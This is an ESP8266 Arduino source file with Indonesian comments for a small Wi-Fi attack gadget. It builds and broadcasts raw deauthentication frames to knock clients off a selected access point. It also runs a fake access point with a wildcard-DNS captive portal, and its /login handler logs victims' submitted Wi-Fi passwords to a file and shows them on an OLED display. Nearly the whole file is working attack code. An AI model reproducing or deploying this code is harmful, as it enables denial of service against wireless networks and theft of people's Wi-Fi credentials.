#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

// ======================================================
// FIX ERROR: wifi_send_pkt_freedom not declared
// ======================================================
extern "C" {
  #include "user_interface.h"
  // Deklarasi paksa fungsi internal SDK 2.0.0
  void wifi_send_pkt_freedom(uint8 *buf, uint16 len, uint16 sys_seq);
}

// Konfigurasi Layar OLED 0.66" (Pin D2 & D1)
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48); 

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
};

Network _networks[15];
Network _selectedNet;
String lastPass = "";
bool isDeauthing = false;
unsigned long lastDeauthTime = 0;

DNSServer dnsServer;
ESP8266WebServer server(80);

// Fungsi Mesin Deauth
void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = { 
    0xC0, 0x00, 0x3A, 0x01, 
    target[0], target[1], target[2], target[3], target[4], target[5], // Receiver
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // Sender
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // BSSID
    0x00, 0x00, 0x01, 0x00 
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

void drawOLED() {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 0, "GM-PRO V3.9");
  display.drawLine(0, 11, 64, 11);

  if (lastPass != "") {
    display.drawString(0, 15, "GOT PASS!");
    display.drawString(0, 28, lastPass.substring(0, 8));
  } else if (isDeauthing) {
    display.drawString(0, 15, "ATTACKING");
    display.drawString(0, 28, "CH:" + String(_selectedNet.ch));
  } else {
    display.drawString(0, 15, "> STANDBY");
    display.drawString(0, 28, "VIVO1904");
  }
  display.display();
}

void setup() {
  SPIFFS.begin();
  display.init();
  display.flipScreenVertically();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1); // Aktifkan mode injeksi paket
  
  // SSID Alat
  WiFi.softAP("vivo1904", "sangkur87"); 
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  // Handler Dashboard
  server.on("/", HTTP_GET, []() {
    File f = SPIFFS.open("/index.html", "r");
    if(f) { server.streamFile(f, "text/html"); f.close(); }
    else { server.send(200, "text/plain", "Data Error: index.html tidak ditemukan!"); }
  });

  // Perintah dari Dashboard
  server.on("/deauth", []() {
    isDeauthing = !isDeauthing;
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/view_pass", []() {
    File f = SPIFFS.open("/pass.txt", "r");
    if(f) { server.streamFile(f, "text/plain"); f.close(); }
    else { server.send(200, "text/plain", "Brankas Kosong."); }
  });

  server.on("/login", []() {
    String p = server.arg("p");
    if (p != "") {
      lastPass = p;
      File f = SPIFFS.open("/pass.txt", "a");
      f.println("Pass: " + p);
      f.close();
    }
    server.send(200, "text/html", "Verifying System...");
  });

  server.onNotFound([]() {
    File f = SPIFFS.open("/index.html", "r");
    if (f) { server.streamFile(f, "text/html"); f.close(); }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  drawOLED();
  
  // Mesin Deauth Jalan
  if (isDeauthing && (millis() - lastDeauthTime > 100)) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    sendDeauth(broadcast, _selectedNet.bssid, _selectedNet.ch);
    lastDeauthTime = millis();
  }

  // Auto Scan WiFi (5 detik sekali)
  if (!isDeauthing && millis() % 5000 == 0) {
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && i < 15; i++) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}
